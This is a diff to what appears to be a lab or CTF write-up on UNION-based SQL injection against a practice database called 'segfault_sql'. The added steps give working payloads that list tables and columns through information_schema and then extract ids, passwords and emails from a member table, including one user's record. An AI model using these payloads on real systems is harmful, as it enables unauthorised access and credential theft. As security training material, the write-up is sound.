@@ -52,13 +52,52 @@ Try injecting:
 ```
 1234' union select datbase(), 2, 3, 4#
 ```
+The name of database is "segfault_sql"	
 
 
 ## (5) Use information_schema.tables to list all table names
 
+![image](https://github.com/user-attachments/assets/45460560-556b-4688-ae25-27218c0a758c)
+
+Try injecting:
+
+```
+1234' union select table_name, 2, 3, 4 from information_schema.tables where table_schema='segfault_sql' #
+```
+The names of the tables are **game, member, secret and secret_member**.
+
 ## (6) Use information_schema.columns to list all column names
 
+
+
+Try injecting:
+
+```
+1234' union select column_name, 2, 3, 4 from information_schema.columns where table_name = 'member' #
+```
+The names of the coulmns in **member** table are **user_id, user_pass,	name, user_level, info ,id, pass and email**.
+
+
+
 ## (7) Finally, use UNION SELECT to extract the data
+
+![image](https://github.com/user-attachments/assets/735d9c72-d0b8-49e1-8f4d-a430dda46d0c)
+```
+1234' union select id, pass, email, info from member #
+```
+
+For getting only doldol's data we fix the payload
+```
+' union select id, pass, email, info from member where id='doldol' #
+```
+
+Result:
+
+![image](https://github.com/user-attachments/assets/dbda74c3-e0f9-4c40-a20f-c9cc8297b36b)
+
+
+
+
 
 
 ---
